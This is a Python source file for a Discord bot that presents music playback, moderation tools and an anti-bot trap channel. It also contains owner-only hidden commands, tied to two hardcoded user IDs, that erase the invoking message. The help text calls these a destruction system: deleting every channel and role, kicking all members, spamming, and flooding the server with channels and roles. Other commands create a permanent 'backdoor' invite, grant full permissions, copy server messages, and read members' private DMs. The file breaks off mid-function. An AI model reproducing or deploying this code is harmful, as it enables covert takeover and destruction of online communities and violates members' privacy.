import asyncio
import ctypes
import datetime
import functools
import io
import json
import re
import os
import platform
import random
import shutil
import string
import time
from threading import Thread
import discord
from discord import ui, opus
from discord.ext import commands
from flask import Flask
import ffmpeg_downloader
import davey
import psutil
import yt_dlp
from google import genai

if not opus.is_loaded():
    try:
        opus.load_opus(davey.opus_path())
    except:
        pass

ffmpeg_exe = "ffmpeg"
if not shutil.which("ffmpeg"):
    try:
        ffmpeg_downloader.download()
        ffmpeg_exe = os.path.join(os.getcwd(), "ffmpeg")
        if os.path.exists(ffmpeg_exe):
            os.chmod(ffmpeg_exe, 0o755)
    except:
        pass

app = Flask('')
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

ALLOWED_IDS = [1008278721007992863, 1359813653544566815]
VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))

async def is_me(ctx):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await ctx.message.delete()
        except:
            pass
        return True
    return False
    
queues = {}

def check_queue(ctx, guild_id):
    if guild_id in queues and queues[guild_id]:
        source = queues[guild_id].pop(0)
        ctx.voice_client.play(source, after=lambda e: check_queue(ctx, guild_id))
        
@app.route('/')
def home():
    return "Bot is alive"

def run():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

def keep_alive():
    t = Thread(target=run, daemon=True)
    t.start()

@bot.event
async def on_ready():
    if not hasattr(bot, 'start_time'):
        bot.start_time = time.time()
    print(f'系統連線成功 | 實例 ID: {VERSION_ID} | 帳號: {bot.user}')

@bot.command(name="help")
async def help_msg(ctx):
    if ctx.author.id not in ALLOWED_IDS: return
    
    embed = discord.Embed(
        title="🧳 旅行者系統 - 指令完整手冊", 
        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動清理痕跡。",
        color=0x2b2d31
    )
    embed.add_field(
        name="🛡️ 基礎管理", 
        value=(
            "`!tm @成員 [分鐘]` - 禁言成員\n"
            "`!kick @成員` - 踢出指定成員\n"
            "`!ban @成員` - 封鎖指定成員\n"
            "`!op [give/remove] @成員` - 給予或剝奪該成員最高通行證\n"
            "`!del_msg [數] [@成員] [字]` - 批次清理訊息，可指定特定成員或特定關鍵字\n"
            "`!add_role @成員 @身分組` - 給與成員身分組\n"
            "`!remove_role @成員 @身分組` - 剝奪成員身分組\n"
            "`!disrole @成員` - 剝奪成員所有身分組\n"
            "`!backdoor` - 獲取永久邀請連結\n"
            "`!move_all [頻道ID]` - 強制全體移動語音\n"
            "`!server_mute [lock/unlock]` - 全服鎖定/解鎖發言\n"
            
        ), 
        inline=False
    )
    embed.add_field(
        name="🎵 語音與掛台",
        value=(
            "`!join_vc` - 加入你所在的語音頻道\n"
            "`!leave_vc` - 退出語音頻道\n"
            "`!play_music [URL]` - 播放SoundCloud 或是DropBox 音訊\n"
            "`!stop_music` - 停止播放音樂\n"
            "`!background_music [on/off]` - 開始或停止播放背景音樂\n"
        ),
        inline=False
    )
    embed.add_field(
        name="🔥 破壞系統", 
        value=(
            "`!del_ch` - 刪除所有頻道\n"
            "`!del_role` - 刪除所有身分組\n"
            "`!100ch` - 建立 100 個頻道\n"
            "`!100rl` - 建立 100 個身分組\n"
            "`!spam [次] [文]` - 洗頻攻擊\n"
            "`!set_server [文]` - 更伺服器名稱\n"
            "`!kick_everyone` - 踢出伺服器全員\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🛠️ 進階工具", 
        value=(
            "`!eval [code]` - 執行動態 Python 腳本\n"
            "`!snapshot` - 導出伺服器完整結構\n"
            "`!setch_trap` - 設置機器人陷阱\n"
            "`!reset` - 強制重啟系統\n"
            "`!test` - 列出Bot的數據\n"
            "`!bye` - 機器人退出伺服器\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🎮 有趣系統", 
        value=(
            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
            "`!dm @成員 [文]` - 以機器人名義私訊成員\n"
            "`!avatar @成員 ` - 查成員\n"
        ), 
        inline=False
    )
    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
    await ctx.send(embed=embed)

@bot.command(name="dm")
async def dm(ctx, member: discord.Member, *, text: str):
    try: await member.send(text)
    except: pass

@bot.command(name="op")
async def op_admin(ctx, action: str = None, member: discord.Member = None):
    if not await is_me(ctx): return
    if action is None or member is None: return
    action = action.lower()
    try:
        if action == "give":
            perms = discord.Permissions.all()
            overwrite = discord.PermissionOverwrite.from_pair(perms, discord.Permissions.none())
            for channel in ctx.guild.channels:
                try: await channel.set_permissions(member, overwrite=overwrite)
                except: pass
        elif action == "remove":
            for channel in ctx.guild.channels:
                try: await channel.set_permissions(member, overwrite=None)
                except: pass
    except: pass

@bot.command(name="del_msg")
async def purge_chat(ctx, amount: int = 10):
    if not await is_me(ctx): return
    try: await ctx.channel.purge(limit=amount)
    except: pass
        
@bot.command(name="kick")
async def kick(ctx, member: discord.Member = None):
    if not await is_me(ctx): return
    if member is None: return
    try: await member.kick(reason="違反相關規定")
    except: pass

@bot.command(name="ban")
async def ban(ctx, member: discord.Member = None):
    if not await is_me(ctx): return
    if member is None: return
    try: await member.ban(reason="違反相關規定")
    except: pass

trap_config = {
    "trap_channel_id": None,
    "notice_channel_id": None,
    "allowed_ids": []
}

trap_config = {
    "trap_channel_id": 1517891054291128330,
    "notice_channel_id": 1483763794047008800,
    "allowed_ids": []
}

@bot.command(name="setch_trap")
async def setch_trap(ctx, notice_channel_id: int = None):
    if not await is_me(ctx): return
    global trap_config
    if notice_channel_id:
        trap_config["notice_channel_id"] = notice_channel_id
    trap_config["trap_channel_id"] = ctx.channel.id
    if ctx.author.id not in trap_config["allowed_ids"]:
        trap_config["allowed_ids"].append(ctx.author.id)
    
    embed_msg = (
        "### 🚨自動封鎖頻道🚨\n\n"
        "- **請勿在此發言。**\n"
        "- 任何發言者將被**立即封鎖**。\n"
        "- 此為專門用來捕捉機器人的陷阱。\n\n"
        "### 🚨AUTO-BAN CHANNEL🚨\n\n"
        "- **DO NOT POST HERE.**\n"
        "- Anyone who posts will be **instantly banned**.\n"
        "- This is a trap to catch bots."
    )
    await ctx.send(embed_msg)

@bot.command(name="del_ch")
async def nuke_channels(ctx):
    if not await is_me(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    await ctx.guild.create_text_channel("general")

@bot.command(name="kick_everyone")
async def kick_everyone(ctx):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member != ctx.guild.owner:
            try: await member.kick()
            except: pass

@bot.command(name="del_role")
async def clear_roles(ctx):
    if not await is_me(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

@bot.command(name="set_server")
async def set_server(ctx, *, name: str):
    if not await is_me(ctx): return
    try: await ctx.guild.edit(name=name)
    except: pass

@bot.command(name="bye")
async def leave_server(ctx):
    if not await is_me(ctx): return
    await ctx.guild.leave()

@bot.command(name="spam")
async def spam(ctx, count: int, *, text: str):
    if not await is_me(ctx): return
    for i in range(min(count, 100)):
        try:
            await ctx.send(f"{text}")
            await asyncio.sleep(0.8)
        except: break

@bot.command(name="100rl")
async def role_hell(ctx):
    if not await is_me(ctx): return
    for i in range(100):
        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        try: await ctx.guild.create_role(name=f"{i}", color=color)
        except: break

@bot.command(name="100ch")
async def flood(ctx, name="ch-----test"):
    if not await is_me(ctx): return
    for i in range(100):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break
            
@bot.command(name="tm")
async def tm(ctx, member: discord.Member = None, minutes: int = 10):
    if not await is_me(ctx): return
    if member is None: return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason="違反相關規定")
    except: pass

@bot.command(name="backdoor")
async def backdoor(ctx):
    if not await is_me(ctx): return
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.author.send(f"永久入口: {inv.url}")
    except: pass

@bot.command(name="move_all")
async def move_all(ctx, channel: discord.VoiceChannel):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try: await member.move_to(channel)
            except: pass

@bot.command(name="disrole")
async def isolate(ctx, member: discord.Member):
    if not await is_me(ctx): return
    try: await member.edit(roles=[])
    except: pass

@bot.command(name="server_mute")
async def server_gate(ctx, status: str):
    if not await is_me(ctx): return
    can_send = True if status == "unlock" else False
    for channel in ctx.guild.text_channels:
        try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
        except: pass

@bot.command(name="add_role")
async def add_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.add_roles(role)
    except: pass

@bot.command(name="remove_role")
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try: await member.remove_roles(role)
    except: pass

@bot.command(name="get_dm")
async def get_dm(ctx, member: discord.Member, limit: int = 10):
    try:
        dm_channel = member.dm_channel or await member.create_dm()
        history = []
        async for msg in dm_channel.history(limit=limit):
            who = "機器人" if msg.author == bot.user else "成員"
            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
        result = "\n".join(reversed(history)) or "無私訊紀錄"
        await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
    except: pass

@bot.command(name="snapshot")
async def snapshot(ctx):
    if ctx.author.id not in ALLOWED_IDS: return
    await ctx.author.send("🚀 正在生成伺服器備份...")
    guild = ctx.guild
    roles = []
    for r in sorted(guild.roles, key=lambda x: x.position):
        if not r.managed and r.name != "@everyone":
            roles.append({
                "name": r.name,
                "color": r.color.value,
                "perms": r.permissions.value
            })
    data = {
        "server": guild.name,
        "roles": roles,
        "categories": []
    }
    for cat in guild.categories:
        cat_info = {"name": cat.name, "overwrites": [], "channels": []}
        for target, ov in cat.overwrites.items():
            cat_info["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
        for ch in cat.channels:
            ch_data = {"name": ch.name, "type": str(ch.type), "overwrites": []}
            for target, ov in ch.overwrites.items():
                ch_data["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
            if isinstance(ch, discord.TextChannel):
                msgs = []
                try:
                    async for m in ch.history(limit=10, oldest_first=True):
                        msgs.append(m.content)
                except: pass
                ch_data["history"] = msgs
            cat_info["channels"].append(ch_data)
        data["categories"].append(cat_info)
    json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
    await ctx.author.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
    
@bot.command(name="eval")
async def eval_code(ctx, *, code: str = None):
    if ctx.author.id not in ALLOWED_IDS: return
    if ctx.message.attachments:
        file_data = await ctx.message.attachments[0].read()
        data = json.loads(file_data.decode('utf-8'))
        await ctx.author.send(f"🏗️ 開始還原伺服器：{data['server']}")
        created_roles = []
        for r_data in data.get('roles', []):
            role = discord.utils.get(ctx.guild.roles, name=r_data['name'])
            if not role:
                try:
                    role = await ctx.guild.create_role(
                        name=r_data['name'],
                        color=discord.Color(r_data['color']),
                        permissions=discord.Permissions(r_data['perms'])
                    )
                except: continue
        created_roles.append(role)
        try:
            payload = {role: i + 1 for i, role in enumerate(created_roles)}
            await ctx.guild.edit_role_positions(payload)
        except Exception as e:
            await ctx.author.send(f"⚠️ 順序調整受限: {e}")
        role_map = {r.name: r for r in ctx.guild.roles}
        for cat_data in data['categories']:
            cat_ov = {}
            for o in cat_data.get('overwrites', []):
                target = role_map.get(o['target'])
                if target: cat_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
            new_cat = await ctx.guild.create_category(cat_data['name'], overwrites=cat_ov)
            for ch_data in cat_data['channels']:
                ch_ov = {}
                for o in ch_data.get('overwrites', []):
                    target = role_map.get(o['target'])
                    if target: ch_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
                if ch_data['type'] == 'text':
                    new_ch = await new_cat.create_text_channel(ch_data['name'], overwrites=ch_ov)
                    for content in ch_data.get('history', []):
                        if content:
                            await new_ch.send(content)
                            await asyncio.sleep(0.5)
                elif ch_data['type'] == 'voice':
                    await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
        return await ctx.author.send("✅ 還原完成!")
        
@bot.command(name="reset")
async def reboot(ctx):
    if not await is_me(ctx): return
    os._exit(0)

@bot.command(name="join_vc")
async def join(ctx):
    if not await is_me(ctx): return 
    if ctx.author.voice and ctx.author.voice.channel:
        voice_channel = ctx.author.voice.channel
        try:
            if ctx.voice_client:
                await ctx.voice_client.move_to(voice_channel)
            else:
                await voice_channel.connect()
        except Exception as e:
            await ctx.author.send(f"❌ 無法加入語音: `{e}`")
    else:
        await ctx.author.send("⚠️ 你必須先進入一個語音頻道！")
        
@bot.command(name="leave_vc")
async def dc(ctx):
    if not await is_me(ctx): return
    try: await ctx.message.delete()
    except: pass
    if ctx.voice_client:
        try: await ctx.voice_client.disconnect()
        except: pass


bgm_enabled = False
is_switching = False
BGM_URL = "https://soundcloud.com/ghostly/c418-haggstrom-1?in=lucas-shearer-913642639/sets/minecraft-soundtrack-disc"

FFMPEG_OPTS = {
    'before_options': (
        '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 '
        '-headers "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\nReferer: https://www.bilibili.com/\r\n"'
    ),
    'options': '-vn -ar 48000 -ac 2 -b:a 256k -packet_loss 5 -af "volume=0.9" -async 1 -frame_duration 20 -preset veryfast'
}

YDL_OPTS = {
    'format': 'bestaudio/best', 
    'quiet': True, 
    'noplaylist': True
}


client = genai.Client()

def fetch_lyrics_via_ai(song_title, uploader=""):
    try:
        prompt = f"""
        你現在是一個精準的音樂歌詞庫。請幫我尋找歌曲的歌詞。
        
        【原始輸入資訊】：
        - 歌名：{song_title}
        - 歌手/上傳者：{uploader}
        
        【搜尋與校正指南】：
        1. 原始歌名可能包含 "[Official MV]"、"【中英字幕】"、"1080P"、"精選" 等雜訊，請先在腦中將其過濾，提取出「真正的歌名」與「主要歌手」。
        2. 請務必比對「歌手/上傳者」資訊，確保找出來的歌詞是該歌手的版本（避免同名異曲抓錯）。
        
        【嚴格回傳規則】：
        1. 只需要回傳這首歌的完整歌詞純文字如果歌詞不是簡體或繁體中文,要找到對應的中文歌詞，不要有任何多餘的格式符號,只顯示中文加英文歌詞。
        2. 絕對不要包含任何自我介紹、開頭客套話、結尾問候或解釋（例如「好的，這是歌詞：」等）。
        3. 如果找不到該歌曲的歌詞，請直接回傳「❌ 找不到相關歌詞」這七個字。
        4. 字數上限請嚴格控制在 1800 字以內，如果歌詞本身超過，請在結尾處做適當的截斷。
        """
        response = client.models.generate_content(
            model='gemini-2.5-flash',
            contents=prompt
        )
        if response.text:
            return response.text.strip()[:1800]
    except Exception as e:
        print(f"歌詞獲取失敗: {e}")
    return "❌ 歌詞載入失敗，請稍後再試。"

class PlayerControlView(discord.ui.View):
    def __init__(self, ctx, url, audio_url, title, duration, uploader):
        super().__init__(timeout=None)
        self.ctx = ctx
        self.url = url
        self.audio_url = audio_url
        self.title = title
        self.duration = duration
        self.uploader = uploader
        self.is_looping = True
        self.manual_stop = False
        self.current_volume = 1.0
        self.start_time = time.time()
        self.message = None

    def _create_progress_bar(self):
        if not self.duration:
            return "🔴 ─── 直播或未知長度 ───"
        
        vc = self.ctx.voice_client
        if vc and vc.is_paused():
            elapsed = int(time.time() - self.start_time)
        else:
            elapsed = int(time.time() - self.start_time)
            
        total = int(self.duration)
        if elapsed > total:
            elapsed = total
            
        bar_length = 20
        progress_position = int((elapsed / total) * bar_length) if total > 0 else 0
        progress_position = min(max(progress_position, 0), bar_length - 1)
        
        bar = "".join(["▬" if i != progress_position else "🔵" for i in range(bar_length)])
        
        elapsed_str = f"{elapsed // 60}:{elapsed % 60:02d}"
        total_str = f"{total // 60}:{total % 60:02d}"
        
        return f"`{elapsed_str}` {bar} `{total_str}`"

    def _get_embed(self, status="正在播放"):
        embed = discord.Embed(title=f"🎵 {status}", color=0x3498db if status == "正在播放" else 0x95a5a6)
        embed.add_field(name="🎵 歌名", value=f"[{self.title}]({self.url})", inline=False)
        embed.add_field(name="📤 上傳者", value=self.uploader, inline=True)
        embed.add_field(name="🔊 音量", value=f"{int(self.current_volume * 100)}%", inline=True)
        
        embed.add_field(name="⏱️ 播放進度 (點擊下方 🔄 可刷新)", value=self._create_progress_bar(), inline=False)
        
        embed.set_footer(text=f"🔄 自動循環: {'開啟' if self.is_looping else '關閉'}")
        return embed

    @discord.ui.button(label="暫停/繼續", style=discord.ButtonStyle.blurple, emoji="⏯️", row=0)
    async def play_pause(self, interaction: discord.Interaction, button: discord.ui.Button):
        vc = self.ctx.voice_client
        if not vc: return await interaction.response.send_message("❌ 機器人不在語音頻道中", ephemeral=True)
        if vc.is_playing():
            vc.pause()
            await interaction.response.edit_message(embed=self._get_embed("已暫停播放"), view=self)
        elif vc.is_paused():
            vc.resume()
            await interaction.response.edit_message(embed=self._get_embed("正在播放"), view=self)

    @discord.ui.button(label="重複: 開", style=discord.ButtonStyle.green, emoji="🔁", row=0)
    async def toggle_loop(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = not self.is_looping
        button.label = f"重複: {'開' if self.is_looping else '關'}"
        button.style = discord.ButtonStyle.green if self.is_looping else discord.ButtonStyle.gray
        await interaction.response.edit_message(embed=self._get_embed(), view=self)

    @discord.ui.button(label="顯示歌詞", style=discord.ButtonStyle.blurple, emoji="🎤", row=0)
    async def show_lyrics(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        lyrics_text = await bot.loop.run_in_executor(
            None, fetch_lyrics_via_ai, self.title, self.uploader
        )
        lyric_embed = discord.Embed(title=f"🎤 搜索歌詞如下: {self.title}  (可能有誤!)", description=lyrics_text, color=0xe74c3c)
        await interaction.followup.send(embed=lyric_embed, ephemeral=True)

    @discord.ui.button(label="音量 +", style=discord.ButtonStyle.gray, emoji="🔊", row=1)
    async def volume_up(self, interaction: discord.Interaction, button: discord.ui.Button):
        vc = self.ctx.voice_client
        if not vc or not vc.source: return await interaction.response.send_message("❌ 目前沒有正在播放的音訊", ephemeral=True)
        self.current_volume = min(self.current_volume + 0.1, 2.0)
        if isinstance(vc.source, discord.PCMVolumeTransformer):
            vc.source.volume = self.current_volume
        await interaction.response.edit_message(embed=self._get_embed(), view=self)

    @discord.ui.button(label="音量 -", style=discord.ButtonStyle.gray, emoji="🔉", row=1)
    async def volume_down(self, interaction: discord.Interaction, button: discord.ui.Button):
        vc = self.ctx.voice_client
        if not vc or not vc.source: return await interaction.response.send_message("❌ 目前沒有正在播放的音訊", ephemeral=True)
        self.current_volume = max(self.current_volume - 0.1, 0.0)
        if isinstance(vc.source, discord.PCMVolumeTransformer):
            vc.source.volume = self.current_volume
        await interaction.response.edit_message(embed=self._get_embed(), view=self)

    @discord.ui.button(label="更新進度", style=discord.ButtonStyle.gray, emoji="🔄", row=1)
    async def refresh_panel(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(embed=self._get_embed(), view=self)

    @discord.ui.button(label="停止播放", style=discord.ButtonStyle.red, emoji="⏹️", row=2)
    async def stop_player(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = False
        self.manual_stop = True
        if self.ctx.voice_client:
            self.ctx.voice_client.stop()
            await interaction.response.send_message("⏹️ 已停止播放", ephemeral=True)
            if self.message:
                try: await self.message.edit(embed=self._get_embed("播放結束"), view=self)
                except: pass
            await asyncio.sleep(1)
            bot.loop.create_task(play_bgm(self.ctx))

    @discord.ui.button(label="退出頻道", style=discord.ButtonStyle.red, emoji="🚪", row=2)
    async def leave_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.is_looping = False
        self.manual_stop = True
        if self.ctx.voice_client:
            if self.message:
                try: await self.message.edit(embed=self._get_embed("播放結束"), view=self)
                except: pass
            await self.ctx.voice_client.disconnect()
            await interaction.response.send_message("🚪 已斷開連線", ephemeral=True)

    @discord.ui.button(label="重新連結", style=discord.ButtonStyle.gray, emoji="🔧", row=2)
    async def reconnect_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.ctx.author.voice:
            try:
                if self.ctx.voice_client:
                    await self.ctx.voice_client.disconnect(force=True)
                await self.ctx.author.voice.channel.connect(reconnect=True)
                await interaction.response.send_message("✅ 已強制重新連接語音端點", ephemeral=True)
            except Exception as e:
                await interaction.response.send_message(f"❌ 重連失敗: {e}", ephemeral=True)


async def silent_play(ctx, current_view):
    global is_switching
    if not ctx.voice_client: return
    try:
        audio_url = current_view.audio_url
        if not audio_url: raise Exception("無法讀取播放快取網址")
        
        source = discord.FFmpegPCMAudio(audio_url, executable=ffmpeg_exe, **FFMPEG_OPTS)
        volume_source = discord.PCMVolumeTransformer(source, volume=current_view.current_volume)
        
        def loop_after(error):
            if current_view.manual_stop or is_switching: return
            if current_view.is_looping and ctx.voice_client:
                current_view.start_time = time.time()
                bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play(ctx, current_view)))
            else:

                if current_view.message:
                    asyncio.run_coroutine_threadsafe(
                        current_view.message.edit(embed=current_view._get_embed("播放結束"), view=current_view), 
                        bot.loop
                    )
                bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))
                
        if ctx.voice_client:
            ctx.voice_client.play(volume_source, after=loop_after)
            
        is_switching = False
    except:
        is_switching = False
        bot.loop.create_task(play_bgm(ctx))


@bot.command(name="play_music")
async def p(ctx, *, url):
    global is_switching
    if not ctx.voice_client:
        if ctx.author.voice:
            try: await ctx.author.voice.channel.connect(reconnect=True, timeout=20)
            except Exception as e: return await ctx.send(f"❌ 無法進入頻道: `{e}`")
        else: return await ctx.send("⚠️ 請先進入語音頻道")
    is_switching = True
    if ctx.voice_client.is_playing() or ctx.voice_client.is_paused():
        ctx.voice_client.stop()
        await asyncio.sleep(1)
        
    is_bilibili = "bilibili.com" in url or "b23.tv" in url
    b_audio_url = None
    b_title, b_uploader, b_duration = '❌ 未知歌曲', '❌ 未知來源', 0

    if is_bilibili:
        async with ctx.typing():
            try:
                import requests
                bvid = None
                bv_match = re.search(r'BV[a-zA-Z0-9]{10}', url)
                if bv_match:
                    bvid = bv_match.group(0)
                if bvid:
                    res = requests.get(f"https://api.bilibili.com/x/web-interface/view?bvid={bvid}", headers={"User-Agent": "Mozilla/5.0"})
                    if res.status_code == 200:
                        b_data = res.json().get('data', {})
                        if b_data:
                            b_title = b_data.get('title', 'Bilibili Audio')
                            b_uploader = b_data.get('owner', {}).get('name', '未知UP主')
                            b_duration = b_data.get('duration', 0)
                            cid = b_data.get('cid')
                            play_res = requests.get(
                                f"https://api.bilibili.com/x/player/wbi/playurl?bvid={bvid}&cid={cid}&fnval=16",
                                headers={"User-Agent": "Mozilla/5.0", "Referer": "https://www.bilibili.com/"}
                            )
                            if play_res.status_code == 200:
                                p_data = play_res.json().get('data', {})
                                if 'dash' in p_data and p_data['dash'].get('audio'):
                                    b_audio_url = p_data['dash']['audio'][0].get('baseUrl')
                                elif 'durl' in p_data and p_data['durl']:
                                    b_audio_url = p_data['durl'][0].get('url')
            except:
                pass

    async with ctx.typing():
        try:
            if is_bilibili and b_audio_url:
                title = b_title
                uploader = b_uploader
                duration = b_duration
                play_source_url = b_audio_url
                view = PlayerControlView(ctx, url, play_source_url, title, duration, uploader)
            else:
                def fetch_initial():
                    with yt_dlp.YoutubeDL(YDL_OPTS) as ydl:
                        return ydl.extract_info(url, download=False)
                info = await bot.loop.run_in_executor(None, fetch_initial)
                if 'entries' in info:
                    if not info['entries']: raise Exception("搜尋結果為空，請稍後再試或更換網址")
                    info = info['entries'][0]
                title = info.get('title', '❌ 未知歌曲')
                uploader = info.get('uploader', '❌ 未知來源')
                duration = info.get('duration')
                play_source_url = info['url']
                view = PlayerControlView(ctx, url, play_source_url, title, duration, uploader)
                
            source = discord.FFmpegPCMAudio(play_source_url, executable=ffmpeg_exe, **FFMPEG_OPTS)
            volume_source = discord.PCMVolumeTransformer(source, volume=view.current_volume)
            
            def initial_after(error):
                if view.manual_stop: return
                if view.is_looping and ctx.voice_client:
                    view.start_time = time.time()
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play(ctx, view)))
                else:

                    if view.message:
                        asyncio.run_coroutine_threadsafe(
                            view.message.edit(embed=view._get_embed("播放結束"), view=view), 
                            bot.loop
                        )
                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))
                    
            if ctx.voice_client:
                ctx.voice_client.play(volume_source, after=initial_after)
            is_switching = False
            

            msg = await ctx.send(embed=view._get_embed(), view=view)
            view.message = msg
            
        except Exception as e:
            is_switching = False
            await ctx.send(f"❌ 播放失敗: `{str(e)[:100]}`")
            bot.loop.create_task(play_bgm(ctx))
    
            
@bot.command(name="stop_music")
async def stop_music(ctx):
    if ctx.voice_client:
        ctx.voice_client.stop()
        await ctx.send("⏹️ 已停止播放")
        await asyncio.sleep(1)
        bot.loop.create_task(play_bgm(ctx))

@bot.command(name="background_music")
async def background_music(ctx, mode: str):
    global bgm_enabled, is_switching
    if mode.lower() == "on":
        bgm_enabled = True
        is_switching = False
        await ctx.send("✅ 背景音樂模式已開啟。")
        if ctx.voice_client and not ctx.voice_client.is_playing():
            await play_bgm(ctx)
    elif mode.lower() == "off":
        bgm_enabled = False
        if ctx.voice_client:
            ctx.voice_client.stop()
        await ctx.send("❌ 背景音樂模式已關閉。")

@bot.command(name="test")
async def test(ctx):
    api_latency = round(bot.latency * 1000)
    voice_latency = "未連線"
    if ctx.voice_client and ctx.voice_client.is_connected():
        voice_latency = f"{round(ctx.voice_client.latency * 1000)}ms"
    process = psutil.Process()
    mem_rss = process.memory_info().rss / 1024 / 1024
    mem_vms = process.memory_info().vms / 1024 / 1024
    mem_percent = process.memory_percent()
    cpu_usage = psutil.cpu_percent()
    num_threads = process.num_threads()
    if hasattr(bot, 'start_time'):
        uptime_seconds = int(time.time() - bot.start_time)
        days, rem = divmod(uptime_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        uptime_str = f"{days}天 {hours}小時 {minutes}分 {seconds}秒"
    else:
        uptime_str = "未知"
    operator_info = f"{ctx.author.display_name} ({ctx.author.id})"
    bgm_status = "✅ 運行中" if bgm_enabled else "❌ 已關閉"
    embed = discord.Embed(title="🛠️ 機器人核心測試報告", color=0x2ecc71, timestamp=ctx.message.created_at)
    embed.add_field(name="👤 操作人員名單", value=f"```{operator_info}```", inline=False)
    embed.add_field(name="⏳ 網路延遲", value=f"**API 延遲:** {api_latency}ms\n**語音閘道:** {voice_latency}", inline=True)
    embed.add_field(name="💻 系統負載", value=f"**CPU 使用率:** {cpu_usage}%\n**執行線程數:** {num_threads} 個", inline=True)
    embed.add_field(name="🧠 記憶體狀態", value=f"**實體 (RSS):** {round(mem_rss, 2)} MB\n**虛擬 (VMS):** {round(mem_vms, 2)} MB\n**記憶體佔比:** {round(mem_percent, 2)}%", inline=True)
    embed.add_field(name="⏱️ 運行統計", value=f"**已連續上線:** {uptime_str}", inline=True)
    embed.add_field(name="🎵 音樂參數", value=(
        f"**背景音樂模式:** {bgm_status}\n"
        f"**FFmpeg 預設:** `veryfast`\n"
        f"**音訊取樣率:** 48000Hz\n"
        f"**切歌鎖定:** {'使用中' if is_switching else '空閒'}"
    ), inline=False)
    embed.add_field(name="⚙️ 環境資訊", value=(
        f"**Python:** {platform.python_version()}\n"
        f"**Discord.py:** {discord.__version__}\n"
        f"**作業系統:** {platform.system()} {platform.release()}"
    ), inline=False)
    embed.set_footer(text=f"查詢者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def profile(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=f"👤 {member.display_name} 的名片", color=member.color)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="加入伺服器時間", value=member.joined_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="最高身份組", value=member.top_role.mention, inline=True)
    embed.set_footer(text=f"ID: {member.id}")
    await ctx.send(embed=embed)
    
@bot.event
async def on_message(message):
    if message.author == bot.user: return
    global trap_config
    if trap_config["trap_channel_id"] and message.channel.id == trap_config["trap_channel_id"]:
        guild = message.guild
        member = message.author
        if not isinstance(member, discord.Member):
            try:
                member = await guild.fetch_member(member.id)
            except:
                pass
        is_admin = False
        if isinstance(member, discord.Member):
            if member.id == guild.owner_id or member.guild_permissions.administrator:
                is_admin = True
        if is_admin or member.id in trap_config["allowed_ids"] or member.id in ALLOWED_IDS:
            await bot.process_commands(message)
            return
        try:
            notice_channel = bot.get_channel(trap_config["notice_channel_id"])
            await guild.ban(member, reason="⚔️ 觸發機器人陷阱：自動判定為惡意詐騙 Bot (如有誤判,請透過好友尋求管理人員協助!)", delete_message_days=1)
            if notice_channel:
                notice_text = (
                    "# 🚨通告\n"
                    f"> ## 用戶：{member.mention} ({member.name})\n"
                    "> ## 因發布不實詐騙訊息將被永久封禁"
                )
                await notice_channel.send(notice_text)
        except Exception as e:
            print(f"❌ Bot封鎖失敗原因: {e}")
        return
    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("! "):
        owner = await bot.fetch_user(ALLOWED_IDS[0])
